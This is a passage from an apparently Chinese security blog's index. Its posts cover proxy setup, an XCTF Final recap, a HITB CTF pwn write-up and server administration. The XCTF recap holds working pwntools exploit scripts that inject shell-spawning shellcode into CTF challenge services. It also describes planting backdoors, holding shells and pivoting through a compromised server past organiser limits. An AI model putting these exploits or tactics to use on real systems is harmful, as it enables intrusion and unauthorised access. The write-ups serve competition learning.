class="line">proxy=http://127.0.0.1:8888</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="variable">$proxy</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="variable">$proxy</span></span><br><span class="line"><span class="built_in">export</span> ftp_proxy=<span class="variable">$proxy</span></span><br></pre></td></tr></table></figure><p>在我的Surge配置文件中是8888端口，所以这里也相应是如此</p><h2 id="Surge-与v2ray-更新于2019-06-21"><a href="#Surge-与v2ray-更新于2019-06-21" class="headerlink" title="Surge 与v2ray(更新于2019-06-21)"></a>Surge 与v2ray(更新于2019-06-21)</h2><p>最近从 shadowsocks 转到了v2ray 于是就还想要使用surge 做v2ray代理。</p><ol><li>首先，下載 <a href="https://github.com/v2ray/v2ray-core/releases">v2ray-core</a> 的最新版本，注意下載的是 v2ray-macos.zip。</li><li>然后配置 config.json。</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="attr">&quot;port&quot;</span>: <span class="number">8886</span>,  <span class="comment">// SOCKS 代理端口，在浏览器中需配置代理并指向这个端口</span></span><br><span class="line">    <span class="attr">&quot;listen&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;socks&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;udp&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;vnext&quot;</span>: [&#123;</span><br><span class="line">        <span class="attr">&quot;address&quot;</span>: <span class="string">&quot;xx.xx.xx.xx&quot;</span>, <span class="comment">// 服务器地址，请修改为你自己的服务器 ip 或域名</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span>: <span class="number">46704</span>,  <span class="comment">// 服务器端口</span></span><br><span class="line">        <span class="attr">&quot;users&quot;</span>: [&#123; <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;xxx-xxx-xxx&quot;</span> &#125;]</span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;freedom&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tag&quot;</span>: <span class="string">&quot;direct&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;routing&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;domainStrategy&quot;</span>: <span class="string">&quot;IPOnDemand&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rules&quot;</span>: [&#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;field&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;ip&quot;</span>: [<span class="string">&quot;geoip:private&quot;</span>],</span><br><span class="line">      <span class="attr">&quot;outboundTag&quot;</span>: <span class="string">&quot;direct&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似于上面这样。</p><ol start="3"><li><p>然后在终端 使用 <code>/path/to/v2ray -config=/path/to/json</code> 來啟動 v2ray。或者写个脚本做配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">nohup ./v2ray --config=./config.json &gt; /dev/null &amp;</span><br></pre></td></tr></table></figure></li></ol><p>紧接着就要配置 surge 部分。</p><ol><li><p>.conf 配置文件文件，在 <code>Proxy</code> 部分添加 <code>v2ray = socks5,127.0.0.1,8886</code></p><p>类似于这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Proxy]</span><br><span class="line">🌍 DIRECT &#x3D; direct</span><br><span class="line">v2ray &#x3D; socks5,127.0.0.1,8886</span><br><span class="line"></span><br><span class="line">[Proxy Group]</span><br><span class="line">☁️ PROXY &#x3D; select, 🏃 AUTO, 🌍 DIRECT, PROXY</span><br><span class="line">PROXY &#x3D; select, 🇭🇰 HK,🇺🇸 us, 🇭🇰 hk ,v2ray</span><br><span class="line">🏃 AUTO &#x3D; url-test, 🇭🇰 HK,🇺🇸 us, 🇭🇰 hk,v2ray,url &#x3D; http:&#x2F;&#x2F;www.gstatic.com&#x2F;generate_204, interval &#x3D; 1200</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Surge </tag>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Final &amp;isc安全训练营 参加总结</title>
      <link href="2017-XCTF-Final.html"/>
      <url>2017-XCTF-Final.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="First-Day"><a href="#First-Day" class="headerlink" title="First Day"></a>First Day</h2><p>第一天去了isc安全训练营,<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01.jpg"></a></p><p>早上听了浏览器内容，主要内容是微软Edge和谷歌Chrome两个浏览器，Chrome是大宝师傅讲的内容。</p><p>比较有印象的的是Vulcan Team 的holynop讲的Edge浏览器的Chakra脚本引擎<br>了解了类型混淆的漏洞，以及如何去利用windgb去调试浏览器。<br>完成rce<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-iscc-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-iscc-01.jpg"></a></p><p><del>（准备自己动手调试下这个漏洞！！！ 应该也会写个博客吧或者拿去投稿？？？）</del></p><p>下午呢，讲的是windows内核漏洞</p><p>手头有poc 也是应该准备复现的漏洞！</p><h2 id="Second-Day"><a href="#Second-Day" class="headerlink" title="Second Day"></a>Second Day</h2><p>这一天正式参加了XCTF决赛了。<br>第一天是Ai解题，</p><p>我们们的策略是，不管是什么题目，第一步发送超级长的字符串，能crash的先让他crash，<br>所以第一天刚开始的时候，我们就get到了六个题目。<br>其中基本都是栈溢出的题目。</p><p>由于是Ai赛制是Ai先crash题目之后我们才能拿到bin文件（正常是这样，但是。。。HHH），</p><h3 id="sof"><a href="#sof" class="headerlink" title="sof"></a>sof</h3><p>栈溢出题目很简单</p><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>有两个漏洞，一个是fmt，一个是栈溢出，fmt的pritnf两个参数我们都可以控制，就是由于这个原因，我们刚开始就一直在gang 格式化传这个点，而忽略了栈溢出。。</p><p>最后还是用栈溢出解决了题目</p><h3 id="packegt"><a href="#packegt" class="headerlink" title="packegt"></a>packegt</h3><p>一个堆溢出漏洞，利用方式是house of force</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;libc.so.6&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;./packet&#x27;</span>)<span class="comment">#,env=env)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;10.0.14.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x0000000000601018</span></span><br><span class="line">shellcode = <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line"><span class="comment">#shellcode +=&quot;\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;</span></span><br><span class="line">shellcode += asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ope</span>(<span class="params">size,string=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    pl = <span class="string">&quot;td&quot;</span></span><br><span class="line">    pl += str(size)</span><br><span class="line">    pl += string</span><br><span class="line">    p.send(pl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    breakpoint = [0x40096d]</span></span><br><span class="line"><span class="string">    bp = &quot;&quot;.join([&quot;b *%d\n&quot;%b for b in breakpoint])</span></span><br><span class="line"><span class="string">    gdb.attach(proc.pidof(p)[0],bp)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.readline()</span><br><span class="line">    p.sendline(<span class="string">&quot;gpRGF622u64jnH6rlgoLgpqGQCjZL42c&quot;</span>)</span><br><span class="line">    ope(<span class="number">0</span>,<span class="string">&quot;\xff&quot;</span>*<span class="number">0x25</span> + shellcode)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    rev = p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    sc_addr = int(rev[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&quot;sc:&#123;0&#125;&quot;</span>.format(hex(sc_addr)))</span><br><span class="line">    <span class="comment">#heap_addr = int(ope(9,&quot;\xff&quot; * 0x100),16)</span></span><br><span class="line">    <span class="comment">#log.info(&quot;heap:&#123;0&#125;&quot;.format(heap_addr))</span></span><br><span class="line">    size = (puts_got - sc_addr - <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    ope(size)</span><br><span class="line">    ope(<span class="number">0</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">5</span>+ p64(<span class="number">0</span>) + p64(sc_addr+<span class="number">0x30</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>到了下午<br>我们到Ai一直没有半点动静了，一直没有新题出来，导致我们可以选择到题目太少，一直僵持在只有六题到情况下。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-challenge-list.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-challenge-list.jpg"></a></p><p>但是这个时候我们到burnegg蛋总在早上到时候已经把Ai到题目全部脱了下来了，一共20个一个不少，于是我换了一个策略，决定人工审题，然后上去。。。那个啥。。。</p><p>于是后面我们又get了 sof2 和 pointguard两个题到crash<br>但是这个时候主办方来了，告诉我们上去到次数太多了，不允许再让我们上去了。。于是我们准备让蛋总来以pwn题目的服务器最为跳板，然后去访问Ai服务器，这次我们自己手动crash</p><p>然后。。。蛋总以我们已经Pwn的题目的服务器的一个稳定shell去访问了Ai服务器，<br>最后第一天比赛结束时候，我们到了第四到名次</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg"></a></p><p>下午解出来到题目</p><h3 id="sof2"><a href="#sof2" class="headerlink" title="sof2"></a>sof2</h3><p>栈溢出</p><h3 id="mp3info"><a href="#mp3info" class="headerlink" title="mp3info"></a>mp3info</h3><p>以及吐槽一下错过了一个上分到机会，pointguard特么太简单了，应该先写exp的，然后再去crash其他题目</p><h2 id="Third-Day"><a href="#Third-Day" class="headerlink" title="Third Day"></a>Third Day</h2><p>第三天，攻防赛</p><p>四个题目，以第前一天的pointguard以及apatch和两个未放出的新题,我们可爱的蛋总同学，由于已经逃了两天课了，想到今天没有web就跑回学校了….于是我们就成了三人组 铁人三项参赛者～</p><h3 id="pointguard"><a href="#pointguard" class="headerlink" title="pointguard"></a>pointguard</h3><p>任意地址写以及格式化传漏洞<br>这个题目规则不允许我们进行patch 只能通过backlist进行拒绝访问的地址，导致这个题目。。。基本没有人防成功</p><p>我们当天完成了三个利用 1.system 2.rop. 3.one gadget</p><h3 id="apatch"><a href="#apatch" class="headerlink" title="apatch"></a>apatch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;apatch&quot;</span>)</span><br><span class="line">pro = process(<span class="string">&quot;./apatch&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gdb.attach(pro)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.amd64.linux.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = p32(<span class="number">0xdeadfafa</span>) + p8(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x3eeb</span>) + p32(<span class="number">1</span>) + p32(len(shellcode))</span><br><span class="line">payload += shellcode</span><br><span class="line">pause()</span><br><span class="line">pro.write(payload)</span><br><span class="line">d = pro.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> ord(d) == <span class="number">0xcc</span></span><br><span class="line">tmp = pro.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">index = u32(tmp)</span><br><span class="line"><span class="keyword">print</span> hex(index)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xdeadfafa</span>) + p8((<span class="number">0x2030a0</span> - <span class="number">0x203020</span>)/<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">pro.write(payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure><p>刚开始的分工是，muhe写black list的patch，通过流量审，添加到blacklist中，然后flier进行新exp，我进行运维，以及后门的添加。。。</p><p>然而，流量审查中出现了应该whireshark打不开流量包的尴尬。。。</p><p>以及后门添加不进去的尴尬。。。于是我们只能手动保持ssh的存在 维持权限，不会以至于对手patch文件后我们不能get flag了</p><p>。。。但是windows用多了。。。我不小心关了五个。。。／bin／sh剩三个。。。</p><p>运维的时候，，，我也出了一点尴尬，，，发现后门的时间太晚了。。。</p><p>所以，，，第二天我们全程是在防守，无暇去尝试流量重放以及去写新的exp去攻击对手</p><p>所以Good Game！<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 HITB CTF  新加坡 Pwn Writeup</title>
      <link href="2017-HITB-CTF-Pwn.html"/>
      <url>2017-HITB-CTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这是一个菜单程序。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-01.jpg"></a><br>其有三个主要功能</p><h3 id="功能一-go"><a href="#功能一-go" class="headerlink" title="功能一 go"></a>功能一 go</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitc-pwn-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitc-pwn-02.jpg"></a></p><p>首先，其会询问你要挑战的总关卡<br>之后会再一次询问，是否要增加关卡</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitbctf-pwn-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitbctf-pwn-03.jpg"></a></p><p>有一个地方值得注意，如果我们在询问level的时候 输入 负数，那么程序将打印出Coward，然后继续询问因此，这一次无论大小，Any more后输入的值都将直接加在v5上， 然而现在的v5还没有进行初始化。</p><p>以及，第二次询问的时候没有判断是否小于0.<br>我们可以看到 level 函数 如图</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-04.jpg"></a></p><p>往buf 读入了0x400的数据，有一个明显的栈溢出。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-05.jpg"></a></p><p>检查一下程序开启的保护。</p><h3 id="功能二-Hint"><a href="#功能二-Hint" class="headerlink" title="功能二 Hint"></a>功能二 Hint</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-06.jpg"></a></p><p>从汇编代码中，我们可以看到，当执行 hint后，无论在哪个分支上，system函数地址都被放到了栈上。</p><h3 id="功能三-give-up"><a href="#功能三-give-up" class="headerlink" title="功能三 give up"></a>功能三 give up</h3><p>退出程序，</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>我们在调试的时候会发现，未初始化的v5 和 system的地址复用了，这就意味着我们已经得到了一个地址，但是由于开启了pie，我们还是不不能完全的控制这个地址去getshell。</p><p>题目给了libc  那么我是否能利用libc？<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-07.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-08.jpg"></a></p><p>在libc中，我们发现，system的地址和one gadget rce 的地址 相差0x4526a-0x45390</p><p>那么如果我们对那个未初始化的参数进行减法运算最后是不是就而已调用到one gadget rce了呢？</p><p>那么接下来的另外一个问题，就是如何控制eip，跳转到这个参数地址了</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-09.jpg"></a></p><p>vmmp中存在 vsyscall</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-10.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-10.jpg"></a></p><p>构造一个ret rop链，不断的去接近目标地址即可。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> HITB CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Rank运维日记  （二）</title>
      <link href="How-to-add-ssh-key.html"/>
      <url>How-to-add-ssh-key.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>客户机 生成公钥<br>        <code>ssh-keygen -t rsa</code></p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>将公钥传到服务器<br><code>scp id_rsa.pub root@ip:/root/.ssh/</code><br>    将公钥导入keys文件<br><code>cat /root/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</code></p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>修改ssh配置文件<br>        <code>Vim /etc/ssh/sshd_config</code></p><p><a href="http://oayoilchh.bkt.clouddn.com/17-8-16/92667768.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-8-16/92667768.jpg"></a></p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>重启服务<br>    <code>service sshd restart</code></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Rank运维日记  （一）</title>
      <link href="Nginx-How-to-install-ssl.html"/>
      <url>Nginx-How-to-install-ssl.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>默认情况下ssl模块并未被安装，如果要使用该模块则需要在编译时指定–with-http_ssl_module参数，安装模块依赖于OpenSSL库和一些引用文件，通常这些文件并不在同一个软件包中。通常这个文件名类似libssl-dev。</p><p>生成证书</p><p>可以通过以下步骤生成一个简单的证书：<br>首先，进入你想创建证书和私钥的目录，例如：</p><p>$ cd /usr/local/nginx/conf<br>创建服务器私钥，命令会让你输入一个口令：</p><p>$ openssl genrsa -des3 -out server.key 1024<br>创建签名请求的证书（CSR）：</p><p>$ openssl req -new -key server.key -out server.csr<br>在加载SSL支持的Nginx 并使用上述私钥时除去必须的口令：</p><p>$ cp server.key server.key.org<br>$ openssl rsa -in server.key.org -out server.key<br>配置nginx</p><p>最后标记证书使用上述私钥和CSR：</p><p>$ openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt<br>修改Nginx配置文件，让其包含新标记的证书和私钥：</p><p>server {<br>    server_name YOUR_DOMAINNAME_HERE;<br>    listen 443;<br>    ssl on;<br>    ssl_certificate /usr/local/nginx/conf/server.crt;<br>    ssl_certificate_key /usr/local/nginx/conf/server.key;<br>}<br>重启nginx。<br>这样就可以通过以下方式访问：</p><p>这里贴出我 `https.conf’的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">                listen <span class="number">443</span>;</span><br><span class="line">                ssl on;</span><br><span class="line">                ssl_certificate /etc/nginx/ssl/ctfrank/ctfrank.crt;</span><br><span class="line">                ssl_certificate_key /etc/nginx/ssl/ctfrank/ctfrank.key;</span><br><span class="line">                ssl_session_timeout <span class="number">5</span>m;</span><br><span class="line">                server_name www.ctfrank.org ctfrank.org;</span><br><span class="line">                <span class="comment">#if ($ssl_protocol = &quot;&quot;) &#123;rewrite ^ https://$server_name$request_uri? permanent;&#125;</span></span><br><span class="line">                add_header Strict-Transport-Security <span class="string">&quot;max-age=3650000&quot;</span>;</span><br><span class="line">                add_header X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span>;</span><br><span class="line">                add_header X-Content-Type-Options nosniff;</span><br><span class="line">                add_header X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span>;</span><br><span class="line"></span><br><span class="line">                location /admin/ &#123;</span><br><span class="line">                        proxy_pass http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span>/;</span><br><span class="line">                        <span class="comment">#proxy_set_header Host $host;</span></span><br><span class="line">                        <span class="comment">#proxy_set_header X-Real-IP $remote_addr;</span></span><br><span class="line">                        <span class="comment">#proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span></span><br><span class="line">                        <span class="comment">#proxy_set_header X-Forwarded-Proto  $scheme;</span></span><br><span class="line">                &#125;</span><br><span class="line">                location / &#123;</span><br><span class="line">                         proxy_pass http://<span class="number">127.0</span><span 